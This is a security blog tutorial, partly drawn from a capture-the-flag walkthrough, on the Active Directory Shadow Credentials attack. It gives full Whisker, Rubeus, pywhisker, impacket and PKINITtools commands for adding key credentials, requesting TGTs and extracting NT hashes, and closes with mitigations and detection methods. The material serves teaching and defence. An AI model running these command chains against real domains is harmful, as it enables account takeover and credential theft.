+++
title = "Understanding the Shadow Credentials Attack Vector"
draft = false
tags = ["Windows", "LDAP", "msDS-KeyCredentialLink", "Shadow Credentials", "Active Directory", "Rubeus", "Whisker", "pywhisker", "cert", "certificate", "pem", "PKINIT", "Certificate Authority"]
keywords = ["Shadow Credentials attack", "Active Directory exploitation", "Certificate-based authentication", "msDS-KeyCredentialLink exploitation", "Kerberos authentication", "Active Directory security", "Whisker tool", "Rubeus exploitation", "Key Trust Account Mapping", "Active Directory privilege escalation"]
description = "A comprehensive guide to understanding and exploiting the Shadow Credentials attack vector in Active Directory environments. Learn about certificate-based authentication exploitation, msDS-KeyCredentialLink manipulation, and how to use tools like Whisker and Rubeus for advanced Active Directory attacks."
author = "bloodstiller"
date = 2024-10-11
toc = true
bold = true
next = true
+++

## Understanding the Shadow Credentials Attack Vector: {#understanding-the-shadow-credentials-attack-vector}

The Shadow Credentials attack is an advanced technique that exploits Active Directory's certificate-based authentication mechanism to compromise user accounts without changing their passwords. This attack leverages the `msDS-KeyCredentialLink` attribute to add a malicious certificate, allowing an attacker to impersonate the target user stealthily.

**To put it simply**: If we have the `WriteProperty` privilege (specifically for the `msDS-KeyCredentialLink` attribute) over a user or computer object, we can set Shadow Credentials for that object and authenticate as them. You read that right, we can add a certificate-based credential to a user or computer and then authenticate as them. We can also request a Kerberos ticket and use it for pass-the-ticket attacks if needed.

### What are Shadow Credentials? {#what-are-shadow-credentials}

The Shadow Credentials attack exploits a feature in Active Directory called Key Trust Account Mapping. This technique allows an attacker to compromise a user account without changing its password, making it particularly stealthy and difficult to detect.

### Key Components of the Shadow Credentials Attack: {#key-components-of-the-shadow-credentials-attack}

1.  **Whisker**: A tool used to manipulate the `msDS-KeyCredentialLink` attribute of a user account.
    - <https://github.com/eladshamir/Whisker>
2.  **Rubeus**: A tool for interacting with Kerberos authentication.
    - <https://github.com/GhostPack/Rubeus>

### Enumerating Users Susceptible to the Shadow Credentials Attack: {#enumerating-users-susceptible-to-the-shadow-credentials-attack}

- **In blood-hound look for the** `AddKeyCredentialLink`:

  - {{< figure src="/ox-hugo/2024-10-11-120229_.png" >}}

- **Being part of the groups below will often provide us with enough privielges to perform the attack**:
  - Key Admins
  - Enterprise Key Admins
  - Admins Group

### Enumerating for the `WriteProperty` `msDS-KeyCredentialLink` attribute on users: {#enumerating-for-the-writeproperty-msds-keycredentiallink-attribute-on-users}

1.  **Using** `PowerView`:
    ```powershell
       Get-DomainObjectAcl -Identity "CN=<User Name>,CN=Users,DC=domain,DC=com" -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "WriteProperty" -and $_.SecurityIdentifier -match "S-1-5-21-.*-500" -and $_.ObjectAceType -eq "00000002-0000-0000-c000-000000000000"}
    ```

<!--listend-->

1.  **Using Active Directory PowerShell Module**:

    ```powershell
       Import-Module ActiveDirectory
       (Get-Acl "AD:CN=<User Name>,CN=Users,DC=domain,DC=com").Access |
       Where-Object {$_.ActiveDirectoryRights -match "WriteProperty" -and $_.IdentityReference -match "Domain Admins" -and $_.ObjectType -eq "00000002-0000-0000-c000-000000000000"}
    ```

2.  **Using ADSI Edit**:

    - A GUI tool for viewing and editing AD objects and their attributes.
    - Connect to the domain
    - Navigate to the user object
    - Right-click and select "Properties"
    - Go to the "Security" tab
    - Click "Advanced"
    - Look for entries with "Write msDS-KeyCredentialLink" permission

3.  **Using dsacls Command-Line Tool**:
    ```cmd
       dsacls "CN=Target User,CN=Users,DC=domain,DC=com" | findstr /i "write.*msDS-KeyCredentialLink"
    ```

### +Shadow Credentials Attack Process: Step by Step+: {#4c7bfe}

#### Pre-requisites for Performing the Shadow Credentials Attack: {#pre-requisites-for-performing-the-shadow-credentials-attack}

- **Domain Functional Level**: Must be 6 or higher (Windows Server 2016 or higher)
- **Domain Controllers**:
  - The target domain must have at least one Domain Controller running Windows Server 2016 or higher.
  - The Domain Controller used in the attack must have its own certificate and private keys.
    - This requires the organization to have Active Directory Certificate Services (AD CS) or a similar Public Key Infrastructure (PKI), such as a Certification Authority (CA).

**Attacker Permissions**:

1.  The attacker starts with some level of access to the domain, typically with privileges to modify user attributes, e.g. `GenericAll`, `GenericWrite`
2.  The attacker needs control over an account with write access to the `msDs-KeyCredentialLink` attribute on the target user or computer account, this can be inherited via the above permissions.

#### Shadow Credentials Attack From A Windows Host: {#shadow-credentials-attack-from-a-windows-host}

##### 1. Whisker Execution: {#1-dot-whisker-execution}

The attacker uses Whisker to add a new "shadow credential" to the target account:

```shell
whisker.exe add /target:nbarley /domain:sugarape.local
```

**This command**:

- Generates a certificate for the target user (in this case, `nbarley`)
- Updates the `msDS-KeyCredentialLink` attribute of the target account
- Outputs a Base64-encoded certificate and a password
- {{< figure src="/ox-hugo/2024-10-11-155959_.png" >}}

##### 2. Certificate Generation and Usage: {#2-dot-certificate-generation-and-usage}

**Whisker creates**:

- An `X.509` certificate
- An associated private key

**The certificate's role in this attack**:

- It's added to the user's `msDS-KeyCredentialLink` attribute in Active Directory
- This attribute allows for certificate-based authentication as an alternative to password-based auth
- The certificate is not directly used like a Kerberos ticket (`.kirbi` file)

**Instead, the process works like this**:

1.  The attacker presents the certificate during the Kerberos authentication process
2.  Active Directory validates the certificate against the one stored in `msDS-KeyCredentialLink`
3.  If valid, AD issues a Kerberos Ticket Granting Ticket (TGT) for the user

##### 3. Rubeus Exploitation {#3-dot-rubeus-exploitation}

The attacker then uses Rubeus to leverage the generated certificate:

```shell
Rubeus.exe asktgt /user:nbarley /certificate:[Base64 Certificate] /password:"[Password From Whisker]" /domain:sugarape.local /dc:DC.sugarape.local /getcredentials /show
```

**This command**:

- Uses the certificate to request a Kerberos TGT for Nathan Barley (nbarley)
- The `/certificate` parameter contains the Base64-encoded certificate
- The `/getcredentials` flag attempts to decrypt the encrypted NTLM hash from the TGT
- The `/show` flag displays the ticket details and other information
- If successful, Rubeus receives a TGT and can extract the NTLM hash

##### 4. Credential Extraction {#4-dot-credential-extraction}

**As a result of this process**:

- Rubeus obtains a TGT for Nathan Barley (nbarley) &amp; generates a `.kirbi` file which can be used for pass-the-ticket attacks.
- It also extracts the user's NTLM hash
- {{< figure src="/ox-hugo/2024-10-11-160210_.png" >}}

#### Shadow Credentials From A Linux Host: {#shadow-credentials-from-a-linux-host}

This section is taken from my writeup for the box EscapeTwo: <https://bloodstiller.com/walkthroughs/escapetwo-box/>

##### Install Required Programs: {#install-required-programs}

We will need two programs to perform this attack [pywhisker](https://github.com/ShutdownRepo/pywhisker) &amp; [pkinit](https://github.com/dirkjanm/PKINITtools).

<!--list-separator-->

- pywhisker:

  If you have not setup pywhisker before run the following commands to download the repo and setup a python virtual environment.

  ```shell
  git clone https://github.com/ShutdownRepo/pywhisker.git
  cd pywhisker
  python3 -m venv whisker
  source whisker/bin/activate
  pip install -r requirements.txt
  ```

<!--list-separator-->

- pkinittools:

  If you have not setup pkinittools before run the following commands to download the repo and setup a python virtual environment.

  ```shell
  git clone https://github.com/dirkjanm/PKINITtools.git
  cd pkinit
  python -m venv pk
  source pk/bin/activate
  pip install -r requirements.txt
  ```

##### 1. Attack Chain Overview: {#1-dot-attack-chain-overview}

- Make ourselves Owner of the `ca_svc` user account.
  - Using `impacket-owneredit`.
  - +Note+: In this scenario we have control over a user called `ryan` who has `WriteOwner` privileges over the user `CA_SVC`.
- Grant ourselves full privileges over the `ca_svc` account.
  - Using `impacket-dacledit`.
- Perform Shadow Credentials Attack.
  - Using `pywhisker`.
- Use `gettgtpkinit` to create a `.ccache`.
- Use `getnthash` to extract the NT has of the `ca_svc` user.

##### 2. Modify Ownership of the `ca_svc` user {#2-dot-modify-ownership-of-the-ca-svc-user}

Modify ownership so `Ryan` has full control of `ca_svc`:

```shell
impacket-owneredit -action write -new-owner 'ryan' -target 'ca_svc' $domain/$user:$pass
```

{{< figure src="/ox-hugo/2025-01-14-071358_.png" >}}

Grant `ryan` full privileges over the user `ca_svc`:

```shell
impacket-dacledit -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' $domain/$user:$pass
```

{{< figure src="/ox-hugo/2025-01-14-071326_.png" >}}

##### 3. Add shadow credentials to the `ca_svc` account &amp; export `.PEM`: {#3-dot-add-shadow-credentials-to-the-ca-svc-account-and-export-dot-pem}

```shell
python3 pywhisker.py -d $domain -u $user -p $pass --target "CA_SVC" --action "add" --filename CACert --export PEM
```

{{< figure src="/ox-hugo/2025-01-14-071341_.png" >}}

- Ignore the capitalization of `CA_SVC` it doesn't matter.

##### 4. Requesting a TGT for `ca_svc` with PKINITtools `getgtgkinit`: {#4-dot-requesting-a-tgt-for-ca-svc-with-pkinittools-getgtgkinit}

Now we perform the same process again to be able to extract their hash by using the `.pem` files we have retrieved to export a `.ccache` we can authenticate with.

```shell
python3 /home/kali/windowsTools/PKINITtools/gettgtpkinit.py -cert-pem CACert_cert.pem -key-pem CACert_priv.pem $domain/ca_svc ca_svc.ccache
```

{{< figure src="/ox-hugo/2025-01-14-071932_.png" >}}

Next we will load the `.ccache` into our `KRB5CCNAME` variable as we will need this for next step.

```shell
export KRB5CCNAME=./ca_svc.ccache
```

##### 5. Requesting the `ca_svc` user hash with PKINITtools `getnthash`: {#5-dot-requesting-the-ca-svc-user-hash-with-pkinittools-getnthash}

Extract the NTHash for the `ca_svc` user:

```shell
python3 /home/kali/windowsTools/PKINITtools/getnthash.py -key 431c[SNIP]6aee9c22ff3391d9 $domain/CA_SVC
```

{{< figure src="/ox-hugo/2025-01-14-072605_.png" >}}

- We now have the `ca_svc` users NT hash.

Verify the hash is valid:
![](/ox-hugo/2025-01-14-072827_.png)

- We now own the `ca_svc` user.

### Impact of the Shadow Credentials Attack {#impact-of-the-shadow-credentials-attack}

- The attacker gains the ability to authenticate as Nathan Barley `nbarley`
- This can lead to further lateral movement or privilege escalation within the domain
- The attack is stealthy, not triggering typical account modification alerts

### Shadow Credentials Attack Mitigation Strategies {#shadow-credentials-attack-mitigation-strategies}

To protect against Shadow Credentials attacks:

1.  Monitor for changes to the `msDS-KeyCredentialLink` attribute
2.  Implement strong access controls on who can modify user attributes in Active Directory
3.  Use advanced threat detection systems that can identify unusual certificate-based authentication patterns
4.  Regularly audit and review certificate issuance and usage in your environment
5.  Implement the principle of least privilege for Active Directory administrators
6.  Use Protected Users security group for sensitive accounts
7.  Enable and configure Windows Defender Credential Guard
8.  Regularly patch and update domain controllers and Active Directory services
9.  Implement multi-factor authentication (MFA) for all user accounts, especially privileged ones
10. Consider using Privileged Access Workstations (PAWs) for administrative tasks

### Shadow Credentials Attack Detection Methods {#shadow-credentials-attack-detection-methods}

1.  **Monitor Active Directory Logs**: Look for `Event ID 4662` with the `msDS-KeyCredentialLink` attribute being modified.
2.  **Use PowerShell Scripts**: Develop scripts to regularly check for unexpected changes to the `msDS-KeyCredentialLink` attribute.
3.  **Implement SIEM Rules**: Create alerts for unusual certificate-based authentication attempts, especially from unexpected sources.
4.  **Network Traffic Analysis**: Monitor for unusual Kerberos traffic patterns that might indicate certificate-based authentication abuse.

### Conclusion {#conclusion}

The Shadow Credentials attack vector demonstrates the evolving complexity of securing modern Active Directory environments. It highlights the importance of looking beyond traditional password-based security and considering certificate-based authentication mechanisms and critical user attributes.

As defenders, staying informed about these advanced techniques is crucial. By understanding attacks like Shadow Credentials, we can better prepare our defenses and protect our organizations from sophisticated threats.

### Sources: {#sources}

- I would recommend reading this for a DEEP dive onto it by the person who discovered the vulnerability: <https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab>

- Here is a great video alos showcasing how simple this attack can be:
  - {{< youtube IK7qPMqSKMY >}}
